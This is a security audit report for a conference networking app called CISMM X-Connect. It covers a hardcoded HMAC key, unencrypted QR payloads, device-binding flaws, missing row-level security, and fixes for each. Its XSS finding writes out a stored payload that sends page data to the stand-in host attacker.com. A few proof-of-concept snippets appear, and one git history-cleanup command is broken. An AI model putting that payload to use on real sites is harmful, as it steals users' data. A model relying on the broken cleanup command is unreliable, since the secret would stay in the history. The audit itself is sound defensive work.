# 🔐 SECURITY AUDIT REPORT - CISMM X-Connect

**Audit Date**: April 8, 2026  
**Severity Level**: 🔴 REQUIRES REMEDIATION BEFORE PRODUCTION  
**Overall Score**: 50/100 (FAILING)  
**Compliance**: ❌ Not production-ready

---

## 📋 Executive Summary

### Findings Overview
- **Critical Issues**: 3
- **High Issues**: 2
- **Medium Issues**: 3
- **Low Issues**: 2

**Risk Level**: 🔴 **HIGH** - Multiple security flaws that could lead to:
- Fraudulent QR code generation
- Device restriction bypass
- Information disclosure
- Potential unauthorized access

**Recommendation**: **DO NOT DEPLOY TO PRODUCTION** until all critical and high issues are resolved.

---

## 🔴 CRITICAL VULNERABILITIES

### CVE-SEC-001: Hardcoded HMAC Secret Key

**Severity**: 🔴 CRITICAL  
**CVSS Score**: 9.8 (Critical)  
**CWE**: CWE-798 (Use of Hard-Coded Credentials)  

#### Description
The HMAC secret key used to sign QR codes is hardcoded in the source code:

**File**: `utils/security.ts:2`
```typescript
const SECRET_KEY = 'CISMM_CONNECT_SECURE_KEY_2025';
```

#### Impact
1. **QR Code Forgery**: Anyone with code access can create valid QR codes
2. **Fraudulent Scanning**: Attackers can inject fake contacts/exhibitor visits
3. **Account Takeover**: Combined with device binding bypass = complete account hijack
4. **Supply Chain Risk**: Secret visible in Git history forever

#### Proof of Concept
```javascript
// Attacker with code access can:
const maliciousUser = {
    id: 'victim-id',
    name: 'Attacker Name',
    email: 'attacker@evil.com'
};

// Generate valid token
const fakeQR = await generateSecureToken(maliciousUser);
// Now attacker can scan as victim
```

#### Remediation
**Priority**: IMMEDIATE (Block all deployments)

1. Move to environment variable:
```diff
- const SECRET_KEY = 'CISMM_CONNECT_SECURE_KEY_2025';
+ const SECRET_KEY = import.meta.env.VITE_HMAC_SECRET;
+ if (!SECRET_KEY) throw new Error('Missing VITE_HMAC_SECRET');
```

2. Set in Netlify:
```
Build Settings → Environment
VITE_HMAC_SECRET = [generate-strong-random-key]
```

3. Rotate the key:
```bash
# After deploying fix:
# All QR codes signed with old key become invalid
# Users must re-register or re-scan
```

4. Audit Git history:
```bash
git log -p -- utils/security.ts | grep SECRET_KEY
# Remove sensitive data from history if needed:
git filter-branch --tree-filter 'grep -r "2025"' --
```

**Verification**:
- [ ] `.env.local` has strong random secret
- [ ] No hardcoded secrets in production code
- [ ] CI/CD passes secret from Netlify
- [ ] Old key rotated after deployment
- [ ] QR codes regenerated with new key

---

### CVE-SEC-002: QR Payload Information Disclosure

**Severity**: 🔴 CRITICAL  
**CVSS Score**: 8.5 (High)  
**CWE**: CWE-311 (Missing Encryption)  

#### Description
QR code payloads are encoded in Base64 but NOT encrypted:

**File**: `utils/security.ts:30-35`
```typescript
const jsonString = JSON.stringify({
    payload,      // ← PLAINTEXT - visible to anyone
    signature: signatureHex
});
return btoa(jsonString);  // ← Base64 ≠ encryption
```

#### Impact
1. **Information Leakage**: Anyone scanning QR can read attendee data
2. **Privacy Violation**: Email, phone, personal info exposed
3. **Social Engineering**: Attackers know attendee details before contacting them
4. **Compliance**: Violates data protection regulations (if applicable)

#### Proof of Concept
```javascript
// Anyone with a phone camera can:
const qrPayload = 'eyJwYXlsb2FkIjp7ImlkIjoiMTIzIiwibmFtZSI6IkpvaG4gU21pdGgiLCJlbWFpbCI6ImRhdGFAZXhhbXBsZS5jb20ifX0=';

// Decode easily:
const decoded = JSON.parse(atob(qrPayload));
// Result: 
// {
//   payload: { id: "123", name: "John Smith", email: "data@example.com" },
//   signature: "abc123..."
// }

// Now attacker knows attendee's email + phone
```

#### Remediation
**Priority**: HIGH (Before any production data QR codes)

1. Add encryption layer (AES-256-GCM):
```typescript
import { webcrypto } from 'crypto';

export const generateSecureToken = async (data: any): Promise<string> => {
    // 1. Generate HMAC (verification)
    const hmacSignature = await generateHMAC(data);
    
    // 2. Encrypt payload (confidentiality)
    const encryptionKey = await crypto.subtle.importKey(
        'raw',
        new TextEncoder().encode(import.meta.env.VITE_ENCRYPTION_KEY),
        { name: 'AES-GCM' },
        false,
        ['encrypt']
    );
    
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt(
        { name: 'AES-GCM', iv },
        encryptionKey,
        new TextEncoder().encode(JSON.stringify(data))
    );
    
    // 3. Return: IV + Encrypted + Signature
    return btoa(JSON.stringify({
        iv: Array.from(iv),
        encrypted: Array.from(new Uint8Array(encrypted)),
        signature: hmacSignature
    }));
};
```

2. Add encryption key to env:
```bash
# Generate 256-bit key
openssl rand -base64 32
# Add to .env.local and Netlify
VITE_ENCRYPTION_KEY=...
```

3. Update verification:
```typescript
export const verifySecureToken = async (token: string): Promise<any | null> => {
    const { iv, encrypted, signature } = JSON.parse(atob(token));
    
    // 1. Verify signature
    const isValid = await verifyHMAC(...);
    if (!isValid) return null;
    
    // 2. Decrypt
    const decrypted = await crypto.subtle.decrypt(
        { name: 'AES-GCM', iv: new Uint8Array(iv) },
        decryptionKey,
        new Uint8Array(encrypted)
    );
    
    return JSON.parse(new TextDecoder().decode(decrypted));
};
```

**Timeline**:
- Week 1: Implement encryption
- Week 2: Test & audit
- Week 3: Deploy + regenerate QR codes

---

### CVE-SEC-003: Device ID Key Inconsistency

**Severity**: 🔴 CRITICAL (Security Impact)  
**CVSS Score**: 7.5 (High)  
**CWE**: CWE-1025 (Comparison Using Wrong Factors)  

#### Description
Two different localStorage keys used for device ID:

**Files**:
- `App.tsx:88` uses `'device_id'`
- `AuthContext.tsx:31` uses `'cismm_device_id'`

#### Impact
1. **Device Binding Bypass**: Two different devices created for same user
2. **Limit Enforcement Failure**: `max_devices=1` bypassed by using alternate key
3. **Multi-Account Risk**: One person can appear as multiple attendees
4. **Points Fraud**: Accumulate points across "different" devices

#### Attack Scenario
```
1. User logs in on Device A
   → Creates device_id via App.tsx
   → Also creates cismm_device_id via AuthContext.tsx
   → DB sees 2 registered devices

2. Attacker logs in as same user
   → Uses cismm_device_id (matches one)
   → App.tsx doesn't check properly
   → Access granted despite max_devices=1

3. Result: Device limit completely broken
```

#### Remediation
**Priority**: IMMEDIATE

Standardize to single key `cismm_device_id`:

```diff
# File: App.tsx:86-93
const [deviceId] = useState(() => {
-   let id = localStorage.getItem('device_id');
+   let id = localStorage.getItem('cismm_device_id');
    if (!id) {
        id = crypto.randomUUID();
-       localStorage.setItem('device_id', id);
+       localStorage.setItem('cismm_device_id', id);
    }
    return id;
});
```

**Verification**:
```bash
# Ensure no other references exist
grep -r "device_id" . --include="*.tsx" --include="*.ts" | grep -v cismm_device_id

# Test: Login multiple times, verify same device ID
```

---

## 🟠 HIGH PRIORITY VULNERABILITIES

### VUL-SEC-004: Missing Input Validation & XSS Risk

**Severity**: 🟠 HIGH  
**CVSS Score**: 7.2  
**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)  

#### Description
Form inputs are NOT sanitized before display:

**Affected Components**:
- News posts (title, content)
- Profile updates (name, bio)
- Comments on ratings

**Vulnerable Code**:
```typescript
// App.tsx:287-304
const handleCreatePost = useCallback(async (data: { 
    title: string; 
    content: string; 
    category: string 
}) => {
    // ❌ NO VALIDATION - empty strings accepted
    // ❌ NO SANITIZATION - XSS vectors accepted
    
    const newPost = {
        title: data.title,  // Could be: <script>alert('xss')</script>
        content: data.content,
        // ...
    };
    
    await supabase.from('news_posts').insert(newPost);
    // Stored & displayed to other users
});
```

#### Attack Scenario
```
1. Attacker creates post with:
   Title: "<img src=x onerror='fetch(\"http://attacker.com/steal?email=\"+document.body.innerText)'>"

2. Post saved to database

3. Other users view news board
   → Image fails to load
   → onerror event fires
   → Their data sent to attacker's server

4. Attacker now has other users' PII
```

#### Remediation

1. Install sanitization library:
```bash
npm install dompurify @types/dompurify
```

2. Create validation utility:
```typescript
// utils/validation.ts
import DOMPurify from 'dompurify';

export const sanitizeInput = (input: string): string => {
    return DOMPurify.sanitize(input, { ALLOWED_TAGS: [] });
};

export const sanitizeHtml = (html: string): string => {
    return DOMPurify.sanitize(html);
};

export const validateNewsPost = (data: any) => {
    const errors: Record<string, string> = {};
    
    if (!data.title?.trim()) {
        errors.title = 'Title required';
    } else if (data.title.length > 100) {
        errors.title = 'Title too long (max 100 chars)';
    }
    
    if (!data.content?.trim()) {
        errors.content = 'Content required';
    } else if (data.content.length > 2000) {
        errors.content = 'Content too long (max 2000 chars)';
    }
    
    return {
        isValid: Object.keys(errors).length === 0,
        errors
    };
};
```

3. Apply in all forms:
```typescript
const handleCreatePost = useCallback(async (data) => {
    // Validate
    const validation = validateNewsPost(data);
    if (!validation.isValid) {
        Object.values(validation.errors).forEach(msg => 
            showToast(msg, 'error')
        );
        return;
    }
    
    // Sanitize
    const sanitized = {
        title: sanitizeInput(data.title),
        content: sanitizeHtml(data.content),
        category: data.category
    };
    
    // Save
    await supabase.from('news_posts').insert(sanitized);
}, [profile, showToast]);
```

**Verification**:
- [ ] All form inputs validated before submit
- [ ] All user content sanitized before display
- [ ] No `dangerouslySetInnerHTML` in code
- [ ] Security tests pass

---

### VUL-SEC-005: Missing Row-Level Security (RLS)

**Severity**: 🟠 HIGH  
**CVSS Score**: 8.0  
**CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)  

#### Description
While RLS policies exist in Supabase, they may not be fully enabled:

**Vulnerable Tables**:
- profiles (partial RLS)
- user_contacts_log (likely missing)
- user_agenda (likely missing)
- session_ratings (likely missing)
- news_posts (admin-only write RLS missing)

#### Impact
1. **Data Leakage**: User can query other users' private data via REST API
2. **Unauthorized Modification**: User can modify other users' data
3. **Privacy Violation**: Contacts, ratings, agenda visible to everyone

#### Proof of Concept
```javascript
// Attacker could:
const { data: allContacts } = await supabase
    .from('user_contacts_log')
    .select('*');
    // If RLS not enabled, gets ALL contacts in system

const { data: otherUserRatings } = await supabase
    .from('session_ratings')
    .select('*')
    .eq('user_id', 'victim-uuid');
    // If RLS not enabled, reads victim's ratings
```

#### Remediation

**Priority**: CRITICAL (Server-side fix)

Create RLS policies in Supabase:

```sql
-- user_contacts_log: Only user can see their contacts
CREATE POLICY "Users can view their own contacts"
ON user_contacts_log FOR SELECT
USING (auth.uid() = user_id OR auth.role() = 'admin');

CREATE POLICY "Users can add contacts"
ON user_contacts_log FOR INSERT
WITH CHECK (auth.uid() = user_id);

-- user_agenda: Only user can manage their agenda
CREATE POLICY "Users can view their own agenda"
ON user_agenda FOR SELECT
USING (auth.uid() = user_id);

CREATE POLICY "Users can manage their agenda"
ON user_agenda FOR INSERT, UPDATE, DELETE
WITH CHECK (auth.uid() = user_id);

-- session_ratings: Only user can see/edit their ratings
CREATE POLICY "Users can view their ratings"
ON session_ratings FOR SELECT
USING (auth.uid() = user_id);

CREATE POLICY "Users can create ratings"
ON session_ratings FOR INSERT
WITH CHECK (auth.uid() = user_id);

-- news_posts: Only admin/exhibitor can create
CREATE POLICY "Anyone can read news"
ON news_posts FOR SELECT
USING (true);

CREATE POLICY "Only admin/exhibitor can create news"
ON news_posts FOR INSERT
WITH CHECK (
    auth.uid() IN (
        SELECT id FROM profiles 
        WHERE role IN ('admin', 'exhibitor')
    )
);
```

**Verification**:
```bash
# In Supabase dashboard:
# 1. Go to each table
# 2. Check "RLS" column → should show "Enforced"
# 3. Test: Try accessing other user's data → should fail
```

---

## 🟡 MEDIUM PRIORITY VULNERABILITIES

### VUL-SEC-006: Admin Device Limit Bypass

**Severity**: 🟡 MEDIUM  
**CVSS Score**: 6.2  
**CWE**: CWE-276 (Incorrect Default Permissions)  

#### Description
Admin users can bypass device limits:

**File**: `AuthContext.tsx:56-68`
```typescript
if (data.role !== 'admin' && !currentDevices.includes(deviceId)) {
    // Admin completely bypasses this check
    if (currentDevices.length < (data.max_devices || 1)) {
        // Add device
    }
}
```

#### Impact
- Compromise of admin account = unrestricted multi-device access
- Less critical if admins are trusted, but risky

#### Remediation
Move to RLS instead:
```sql
CREATE POLICY "Device limit enforcement"
ON profiles FOR UPDATE
USING (
    auth.uid() = id OR auth.role() = 'admin'
)
WITH CHECK (
    (auth.uid() = id AND array_length(registered_devices, 1) <= max_devices)
    OR auth.role() = 'admin'
);
```

---

### VUL-SEC-007: Insufficient Error Handling

**Severity**: 🟡 MEDIUM  
**CVSS Score**: 5.8  
**CWE**: CWE-209 (Information Exposure Through an Error Message)  

#### Description
Error messages may leak sensitive information:

```typescript
catch (err: any) {
    showToast(err.message, 'error');  // ← Shows detailed DB errors
}
```

Example exposed errors:
- "row level security policy violation" → reveals RLS exists
- "unique constraint violation" → reveals DB schema
- "foreign key constraint violation" → reveals relationships

#### Remediation
```typescript
const handleSupabaseError = (error: any): string => {
    // Classify error
    if (error.code === '23505') {
        return 'Este elemento ya existe';
    }
    if (error.message?.includes('row level security')) {
        return 'Acceso denegado';
    }
    if (error.code === '42P01') {
        return 'Error de servidor (contactar admin)';
    }
    
    // Log full error for debugging
    if (import.meta.env.DEV) {
        console.error('Full error:', error);
    }
    
    // Return generic message
    return 'Algo salió mal. Por favor intenta de nuevo.';
};
```

---

## 🟢 LOW PRIORITY / RECOMMENDATIONS

### REC-SEC-008: CORS Configuration
**Severity**: 🟢 LOW  
**Status**: Supabase handles this  

Verify CORS allows only your domain:
```bash
# Check in Supabase settings
# Should be: https://your-domain.com
# NOT: * (allow all)
```

### REC-SEC-009: Rate Limiting
**Severity**: 🟢 LOW  
**Recommendation**: Add rate limiting to prevent:
- Brute force login attempts
- QR scanning spam
- API abuse

```typescript
// Future implementation
import { RateLimiter } from 'rate-limiter';

const loginLimiter = new RateLimiter(
    5,      // max attempts
    60000   // per 60 seconds
);

const handleLogin = async () => {
    if (!loginLimiter.allow(deviceId)) {
        showToast('Too many attempts. Try again in a few minutes', 'error');
        return;
    }
    // ... login logic
};
```

### REC-SEC-010: HTTPS Enforcement
**Severity**: 🟢 LOW  
**Status**: ✅ Already enforced by Netlify

Add HSTS header:
```javascript
// In Netlify headers file or _redirects:
/*
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  X-XSS-Protection: 1; mode=block
```

---

## 📊 Vulnerability Summary Table

| ID | Type | Severity | Status | Est. Fix Time |
|----|------|----------|--------|---------------|
| SEC-001 | Hardcoded Secret | 🔴 CRITICAL | NOT STARTED | 30 min |
| SEC-002 | Unencrypted Payload | 🔴 CRITICAL | NOT STARTED | 2-3 hrs |
| SEC-003 | Device ID Mismatch | 🔴 CRITICAL | NOT STARTED | 15 min |
| SEC-004 | Input Validation | 🟠 HIGH | NOT STARTED | 1-2 hrs |
| SEC-005 | Missing RLS | 🟠 HIGH | PARTIAL | 1-2 hrs |
| SEC-006 | Admin Bypass | 🟡 MEDIUM | BY DESIGN | 1 hr |
| SEC-007 | Error Leakage | 🟡 MEDIUM | NOT STARTED | 2 hrs |
| REC-008 | CORS | 🟢 LOW | ✅ DONE | - |
| REC-009 | Rate Limit | 🟢 LOW | FUTURE | 2 hrs |
| REC-010 | HSTS | 🟢 LOW | ✅ DONE | - |

---

## 🛡️ Security Checklist Before Production

- [ ] All critical issues (SEC-001, 002, 003) fixed
- [ ] Input validation on all forms
- [ ] Input sanitization on all displays
- [ ] RLS enabled on all sensitive tables
- [ ] Error messages don't leak information
- [ ] No secrets in code or Git history
- [ ] HTTPS enforced
- [ ] HSTS headers set
- [ ] Security headers configured
- [ ] Admin accounts secured (strong passwords)
- [ ] Database backups configured
- [ ] Monitoring/alerting set up
- [ ] Security audit completed
- [ ] Penetration testing done
- [ ] Compliance check (GDPR/local laws)

---

## 📞 Security Incident Response

If a security issue is discovered in production:

```
1. IMMEDIATE (Within 1 hour):
   ├─ Verify the issue
   ├─ Assess impact
   └─ Notify stakeholders

2. SHORT-TERM (Within 24 hours):
   ├─ Deploy hotfix
   ├─ Monitor for abuse
   └─ Document incident

3. FOLLOW-UP (Within 7 days):
   ├─ Post-mortem analysis
   ├─ Root cause identification
   ├─ Prevent recurrence
   └─ Update security policies
```

---

## 📚 Security Resources

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- CWE Common Weakness Enumeration: https://cwe.mitre.org/
- Supabase Security: https://supabase.com/docs/guides/auth
- Web Security Academy: https://portswigger.net/web-security

---

## ✅ CONCLUSION

**DO NOT DEPLOY TO PRODUCTION** without remediating all critical and high-severity issues.

**Recommended Path**:
1. **Week 1**: Fix all critical issues (SEC-001, 002, 003)
2. **Week 2**: Fix all high issues (SEC-004, 005)
3. **Week 3**: Fix medium issues (SEC-006, 007)
4. **Week 4**: Security audit + penetration testing
5. **Week 5**: Production deployment

**Next Steps**:
1. Assign security tasks to development team
2. Set up security testing environment
3. Schedule security audit
4. Create incident response plan
5. Brief all stakeholders

---

**Report Generated By**: Security Audit Tool  
**Next Review Date**: After deployment  
**Review Frequency**: Quarterly

